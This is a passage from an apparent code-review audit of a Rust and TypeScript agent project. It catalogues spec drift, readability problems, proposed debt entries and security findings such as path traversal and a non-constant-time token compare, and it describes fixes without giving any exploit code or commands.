`{cmd:"task_create"; project_id?: string; title?: string; input: string; durable?: boolean; max_steps?; cost_cap_cents?}`.
Impl at `ws.rs:54-58` takes only `{input, max_steps?, cost_cap_cents?}`.
Project routing relies on `IntakeRouter`'s `find_or_create_inbox`
fallback (always defaults to Inbox); title defaulting is
`intake/router.rs:288 derive_title` (truncated brief); `durable` field
is gone entirely. Silent.

**6. Five spec'd HTTP routes missing or substituted**:

| Spec'd route (architecture §4) | Status |
|---|---|
| `GET /v1/projects/:id` | ❌ missing |
| `PATCH /v1/projects/:id` | ⚠️ replaced by `POST /v1/projects/:id/archive` (one-way, no rename / un-archive) |
| `GET /v1/tasks/:id/notifications` | ❌ missing |
| `GET /v1/tasks/:id/intake` | ❌ missing |
| `GET /v1/tasks/:id/deliveries` | ❌ missing |
| `GET /v1/notify/config` | ❌ missing |

None recorded in `DEBT.md` or any story's "Files changed" / divergence
section. The frontend (2.22 / 2.23) doesn't currently need them — but
the externally-visible HTTP surface is silently smaller than the spec
promises, and the CLI's `seasoned-hand inbox` / `task show` flows
through other routes.

**7. Story 2.20 narrator test surface trimmed.** Spec listed 4 tests
including two `main_rs_loads_classifier_prompt_when_present` /
`main_rs_degrades_to_templated_when_prompt_missing` cases. The file
`tests/narrator_wiring.rs` has 3 tests substituting simpler
builder-method coverage. The graceful-degradation path on missing
`narrator.system.txt` has no automated assertion. Not in DEBT.

**8. Notify worker missing 2 spec'd live-Redis tests.** Story 2.12
spec'd `notify_worker_consumes_and_dispatches` and
`notify_worker_xacks_on_dispatch_error` as `#[ignore]` live-Redis tests.
Neither exists. Worker XREADGROUP loop covered only indirectly via
in-memory `handle_request_*` tests. Not in DEBT.

**9. Channel framework symmetry holds.** Each of `chat` (baseline),
`webhook`, `email`, `ntfy`, `cli` goes through `ChannelRegistration`
+ `register_channel` exactly once. No back-door API. Verified at
`main.rs:96-127` + `lib.rs:454-460, 551-718`.

**10. Naming asymmetry `*Router` vs `NotifyWorker`** has a clear
unstated rationale: routers (`IntakeRouter`, `DeliveryRouter`) are
in-process Tokio coordinators; workers (`NotifyWorker`, Phase 1
`verifier::worker::Worker`) are Redis XREADGROUP consumer-group
members. Worth one line in `notify/worker.rs` doc block.

---

## (4) Readability findings

### WHAT-comments to delete (~25 lines total)

- `// Validate.` at `crates/seasoned-hand-core/src/intake/router.rs:162` — restates the function purpose.
- `// Resolve project: explicit override → Inbox fallback.` at `intake/router.rs:190` — match arms self-document.
- `// Late-bind intake → task.` at `intake/router.rs:219` — function name carries the meaning.
- `// Newest-first.` at `frontend/components/agent-computer/decisions-tab.tsx:50` — `reverse()` after forward-walked array is unambiguous.
- `// First attempt.` at `crates/seasoned-hand-core/src/delivery/router.rs:153` and `crates/seasoned-hand-core/src/notify/worker.rs:263` — retry policy already in module doc.
- `// First attempt — write source + render.` at `task_deliver.rs:276` — variable name `attempt_one` says it.
- Numbered `// (1)/(2)/(3)/(4)` callouts inside test body at `crates/seasoned-hand-core/src/notify/listener.rs:317-335` — test name already describes behavior.
- `// 1. … // 2. … // 3. … // 4.` step outline in `WsInitializerSpawner::spawn` at `initializer_spawner.rs:62-114` — most steps restate next 3-5 lines; only Note (story 2.8b) block and `runner.resume(req)` clarification are real WHY. Trim leading restatement sentences.
- `// Step 0/1/2/3+/N` outline in `task::resume_task` at `resume.rs:169-231` — most are 1-line headers above 5-20 lines that already say what they do. Keep Step-2 third sentence (`SANDBOX_SKIP_RENDERER_INSTALL=1 ...`) as load-bearing WHY; trim the rest.
- `// Step 1: planner-LLM simplify ...` / `// Step 2: re-attempt render ...` / `// Step 3: fall back ...` at `task_deliver.rs:485, 495, 529` — module doc-block already enumerates the 8-step pipeline.

### WHY-comments missing

- **`mark_delivered` lies (HIGH priority rename)**. Function name implies a state mutation; the body is `SELECT 1 FROM deliverables WHERE id = ?` after DEBT #11 close. Caller treats it as an existence guard. **Rename to `assert_exists` / `ensure_exists`.** `crates/seasoned-hand-core/src/deliverable/store.rs:146-172`.
- **`Deliverable.rendered_content_path` doc says "sandbox-relative"** but the field is now **absolute** (DEBT #32 close in story 2.26). Doc is actively misleading; readers will write incorrect consumers. One-line fix. `crates/seasoned-hand-core/src/deliverable/mod.rs:38`.
- **`tenant_id: None` hard-coded in 6+ places with no WHY** tying it to "Phase 2 single-operator; flips to NOT NULL in Phase 5 (BASELINE §4 multi-tenant-ready schema)". Sites: `seasoned-hand-server/src/lib.rs:1520`, `ws.rs:309`, `notify/worker.rs:579`, `task_deliver.rs:392`. Add one WHY on the struct definition (`channel::intake::IntakeEvent::tenant_id` field) + one-line back-references at each construction site.
- **Per-task mpsc capacity = 8 is hard-coded without DEBT #20 link**. `initializer_spawner.rs:43-47` doc says "allow a small buffer for fast confirm+edit" but doesn't mention the loose `in_reply_to_call_id` match (DEBT #20) — which is the actual reason buffer > 1 is required. Cite DEBT #20.
- **Initializer loose-match contract**. `initializer_spawner.rs:88-94` says `(loose match — DEBT-noted on phase-2 ledger)` — should cite the number: `(loose match — see phase-2 DEBT #20)`.
- **SSRF default-deny posture inline**. `crates/seasoned-hand-core/src/channel/webhook/mod.rs:145` calls `ssrf::assert_public_address(...)` with no inline comment. The module doc mentions §9 in the import block, but a reader scanning the body sees the call cold. Prepend `// Architecture §9 default-deny: every callback URL must resolve to a public address unless WEBHOOK_DELIVERY_ALLOWLIST bypasses (DEBT #1).`
- **Replay cost baseline reset citation**. `task::replay::replay_cost_baseline` doc says `(see DEBT ledger entry added by story 2.16)` — replace with `(see phase-2 DEBT #28)` for searchability.
- **Casing inconsistency `"Deliverable"` vs `"deliverable"`** Misc kinds — `crates/seasoned-hand-core/src/channel/chat.rs:109` (`"kind": "Deliverable"`) vs `crates/seasoned-hand-core/src/deliverable/task_deliver.rs:435` (`"kind": "deliverable"`). Every other Misc kind in the codebase is snake_case (`task_state`, `briefing_pending`, `verifier_verdict`, `task_resumed`). Pick the lowercase form or document both casings — borderline bug, audit consumers first.

### TODO / FIXME / XXX / HACK

✅ **Zero hits across the entire Phase 2 surface.** AGENTS.md §9 rule
fully respected; deferred work in `DEBT.md` instead.

### Module organization

- `crates/seasoned-hand-core/src/channel/email/mod.rs` is 621 lines
  mixing 7 concerns. Lines 475-621 are a cohesive parser cluster
  (`header_value`, `parse_address`, `extract_text_body`,
  `collect_attachments`, `walk_attachments`, `parse_auth_results`,
  `capture_token`, `normalize_msgid`, `guess_content_type`,
  `filename_for`) with no `EmailChannel` dependency. Pull into
  `email/parse.rs`.
- `crates/seasoned-hand-core/src/deliverable/task_deliver.rs` is 967
  lines (~620 prod + ~340 test). Lift `#[cfg(test)] mod tests` into a
  sibling `task_deliver/tests.rs` to match the pattern every other
  Phase 2 module uses.
- `crates/seasoned-hand-core/src/notify/worker.rs` similarly carries
  ~130 lines of inline tests. Same recommendation.

### Public API surface

Mostly healthy. Each submodule has a clean `pub use` summary.
Minor: `channel::webhook::ssrf::parse_allowlist` is consumed from
`server/main.rs:87` via the fully-qualified path; one shallow
`pub use webhook::ssrf::parse_allowlist as parse_webhook_allowlist;`
at `channel/mod.rs` would tidy the ergonomic.

### Naming

- **`mark_delivered` lies** — see WHY-comments missing above. RENAME.
- Table naming asymmetry: `delivery_events` (noun-events-table) vs
  `notifications_sent` (verb-past-participle) — both are append-only
  per-attempt audit logs with `ok: bool`. Reader will wonder if they're
  semantically different. They aren't. Documenting in V008's migration
  comment is a 3-line fix; renaming `notifications_sent` to
  `notify_events` for symmetry would be cleaner but requires another
  migration (defer to Phase 5).
- `briefing_id` aliased to `task_id` in the inbox handler is openly
  documented at `lib.rs:2540-2549` with a 5-line WHY block — positive
  example, listed only to acknowledge the deliberate trade-off.
- Acronyms clean. Cryptic identifiers (`r`, `s`, `t`, `e` in non-trivial
  scope) — zero hits.

### Frontend cohesion

- `briefing-card.tsx:102-117` parses Edit JSON inline via `try { JSON.parse }`.
  Story 2.23 ships intentionally minimal (per-field editor is Phase 4+).
  Acceptable.
- DeliverablesTab (HTTP fetch on `taskId` change) and DecisionsTab
  (pure WS-projection of existing event stream) are structurally
  distinct on purpose. Worth a one-line comment in each saying so.
- No TSX > 400 lines.
- `chat.tsx:52-77` `briefingIndex` `useMemo` reducer is borderline;
  extract to `lib/briefing-index.ts` if a second consumer ever needs it.
  Today there isn't one; keep as-is.

### Test naming and traceability

Strong overall — names describe behavior in ≥90% of cases. Worst
offenders use the function-name `*_crud` pattern: `intake_event_store_crud`,
`delivery_event_store_crud`, `deliverable_store_crud`, `project_store_crud`,
`task_store_crud`, `notifications_sent_store_crud`. Split each into
2-3 behavior tests or rename to `*_round_trips_one_row` if the body
really is just one insert + one fetch. Low priority.

`phase2_overnight_default_path` is a 450-line E2E with a generic name
but the file itself has only one test; file name supplies context.

DEBT references appear in inline test assertions (good, e.g.
`task_deliver_writes_source_and_renders`'s DEBT #32 comment at
`task_deliver.rs:822-835`), not in test names. Current convention is
readable; keep as-is.

### Error message actionability

- **`internal_error` and `db_error` are opaque** to API consumers.
  Both appear 4+ times in `lib.rs` with identical literal strings.
  Extend the existing `<code>:<subcode>` pattern (used by
  `intake_rejected:empty_brief` and `deliver_timeout:<task>:<intake>`)
  to internal-error responses, e.g. `internal_error:list_events`,
  `db_error:list_sessions`. Sites: `lib.rs:892, 962, 1003, 1101, 1146,
  1557, 1670, 1700, 2463`.
- **HTTP vs WS error envelope inconsistency**: HTTP `intake_rejected:duplicate_intake_id`
  (`lib.rs:1535`) vs WS `error: "duplicate_intake_id"` (`ws.rs:339`).
  Unify on the `intake_rejected:` prefix across both transports so
  FE can prefix-match.
- ✅ CLI `error: {err:#}` anyhow chain walker is good.
- ✅ `intake_token_not_configured` (503) vs `unauthorized_token` (401)
  WHY block at `webhook/mod.rs:55-67` is excellent.

---

## (5) Convergent cross-cutting issues

Three findings surface from multiple audit dimensions:

1. **Loopback inconsistency on provenance route** — flagged by both
   Security (Section C) and Stickiness (story 2.15). Single one-line
   fix at `lib.rs:1887`.

2. **WS verbs `session_id` vs `task_id`** — flagged by both
   Stickiness 2.1-2.13 (cross-finding) and Stickiness 2.14-2.27
   (story 2.16). Same root cause: Phase 1 1.17 introduced
   `task_pause/resume/cancel` keyed by `session_id`; story 2.16 added
   `durable` without changing the key. HTTP routes were Phase 2-native
   and correctly use `task_id`. Either reconcile the WS shape (breaking
   change) or document the divergence in architecture §4.

3. **Timestamp unit drift** — Stickiness 2.14-2.27 (decisions-tab,
   verifier-tab) chains with Readability (no WHY-comment documenting
   the μs convention). Three-line fix in two frontend files plus a
   one-line convention note in `ws-types.ts`.

---

## (6) Recommended new DEBT entries

The following should land in `specs/phase-2/DEBT.md` as appended
entries. **Not silently appended by this review** — proposed here for
human approval.

| # | Title | Severity | Origin (this review §) |
|---|---|---|---|
| 33 | Frontend timestamp unit drift: μs vs s vs ms | M | Stickiness/A + Readability |
| 34 | `GET /v1/tasks/:id/provenance` not loopback-gated | M | Security/C + Stickiness 2.15 |
| 35 | Webhook intake `session_id_hint` path traversal | **H** | Security/G |
| 36 | LLM `target_filename` shell-inject / bind-mount escape | **H** | Security/B |
| 37 | Admin-token compare uses `!=` not constant-time | M | Security/C |
| 38 | `normalize_workspace_relative_path` does not strip `..` | M | Security/G |
| 39 | WS `task_pause/resume/cancel` use `session_id`, spec says `task_id` | M | Stickiness cross-finding 4 |
| 40 | 5 spec'd HTTP routes missing or substituted | M | Stickiness cross-finding 6 |
| 41 | `mark_delivered` lies + `rendered_content_path` doc lies | L | Readability |
| 42 | `.env.example` missing 18+ Phase 2 vars | L | Simplicity |
| 43 | WS `briefing_confirm` no auth (Phase 0 DEBT #7 re-scope) | M | Security/H |
| 44 | Story 2.5 `RouteOutcome<T>` requirement unmet on channels routes | L | Stickiness 2.5 |
| 45 | Story 2.12 missing 2 `#[ignore]` live-Redis worker tests | L | Stickiness 2.12 |
| 46 | EmailChannel reads absolute `rendered_content_path` without containment check | M | Security/D |
| 47 | DNS-rebinding TOCTOU between SSRF guard and reqwest send | L | Security/A |

Items #35 and #36 are the only **H**-severity additions; both materially
affect Phase 2 single-operator security posture today (webhook intake
is reachable by any caller holding the token), unlike Phase 5-deferred
items which are 🔒 today and ⚠️ tomorrow.

---

## (7) Suggested follow-up commits

Tightest cuts, ordered by impact-per-LOC:

1. **One-line fix** — add `require_loopback(remote)?` to
   `get_task_provenance_handler` (`lib.rs:1887`). Closes recommended
   DEBT #34.
2. **Three-line fix** — `decisions-tab.tsx:90` (`/1000`) +
   `verifier-tab.tsx:228-234` (drop the `* 1000`) + a one-line WHY
   in `ws-types.ts`. Closes recommended DEBT #33.
3. **Five-line fix** — replace `!= state.admin_token.as_str()` with
   `subtle::ConstantTimeEq::ct_eq` at `lib.rs:1633` and `:1794`.
   Closes recommended DEBT #37.
4. **~20-line fix** — `session_id_hint` allowlist regex at
   `intake/router.rs:230-234`. Closes recommended DEBT #35.
5. **~30-line fix** — `target_filename` allowlist regex +
   `normalize_workspace_relative_path` `..` block. Closes DEBT #36 + #38.
6. **~30-line doc churn** — `.env.example` Phase 2 section. Closes
   recommended DEBT #42.
7. **Rename + doc-fix** — `mark_delivered` → `assert_exists` in
   `deliverable/store.rs` + one-line caller update in `delivery/router.rs`;
   `Deliverable.rendered_content_path` doc-comment from "sandbox-relative"
   to "absolute host path resolved at persist-time (DEBT #32)". Closes
   recommended DEBT #41.
8. **Trait collapse** — drop `SandboxJanitor`, `WorkspaceWriter`,
   `SandboxOps` traits in favor of `Arc<SandboxClient>` + `#[cfg(test)]`
   mocks. ~50 lines of generic plumbing removed.

Items 1-3 are trivial and could land in a single hardening pass 2
commit; items 4-7 are independent and could be split across multiple
commits or bundled as a Phase 3 warm-up batch.

Total proposed cleanup: ~150 lines added + ~100 lines removed across
~10 files. Each item is independently revertable; none touches the
immutable `/specs/01-architecture/ARCHITECTURE.md`,
`/specs/phase-2/architecture.md` v2.1, or `/AGENTS.md` / `/CLAUDE.md`
(NEVER-list compliance).

---

## (8) Positive findings worth recording

To balance the drift catalog, the audit also surfaced several
**materially strong** Phase 2 properties:

- **Zero TODO/FIXME/XXX/HACK** in the entire Phase 2 surface — every
  deferral is in `DEBT.md`.
- **SQL parameterization is uniform**: zero `format!`-built queries
  across every new store; ORDER BY constants; LIMIT placeholder-bound.
- **SSRF posture is comprehensive**: IPv4 + IPv6 reserved-range
  enumeration is thorough (loopback, private, link-local, multicast,
  unspecified, broadcast, documentation, CGN, ULA, 6to4, IPv4-mapped).
- **DEBT #14 shell-injection fix** (story 2.19) is correctly file-based
  with regression test; `phase_id: i64` precludes injection in the
  message filename itself.
- **Webhook token compare** correctly uses `subtle::ConstantTimeEq::ct_eq`
  + fail-closed on unconfigured env.
- **Email TLS** is implicit-TLS-from-start (`AsyncSmtpTransport::relay`,
  `TlsConnector::from(rustls_config).connect`); no STARTTLS / plaintext
  fallback.
- **Tool-mask** correctly enforced: `task_deliver` is Worker-mode-only;
  `checkpoint_rollback` is Internal-only; both have negative-mask tests.
- **Server-side `Brief::validate`** is re-run after each edit cycle —
  client cannot bypass.
- **Channel framework symmetry** holds: all 5 channels through
  `ChannelRegistration` + `register_channel`; no back-door API; chat
  baseline survives every subsequent registration (DEBT #17 close
  verified).
- **DEBT discipline** is honest: 8 in-phase entries closed in-phase,
  none rewritten, none re-litigated, every open entry has a named
  pay-down phase.
- **Test names describe behavior in ≥90% of cases**; DEBT references
  inline in assertion comments are searchable.
- **Module-level WHY-doc-blocks** are unusually thorough — every Phase 2
  module starts with a 1-screen header citing architecture sections +
  DEBT entries. The codebase materially **under-uses** TODOs and
  **over-uses** WHY-doc-blocks, exactly inverted from the typical risk
  pattern and consistent with the "tight specs, no speculative code"
  preference.

---

*Reviewer's overall assessment: Phase 2 is a successful release. The
spec-driven discipline visibly held across 27 stories in 3 calendar
days under parallel-mode compression. The drifts catalogued above are
small, localized, and mostly cosmetic — the two H-severity security
items are bounded by Phase 2's single-operator threat model but should
land in a hardening-pass-2 commit before Phase 3 begins, since
Phase 3's learning-system surface only grows the blast radius.*
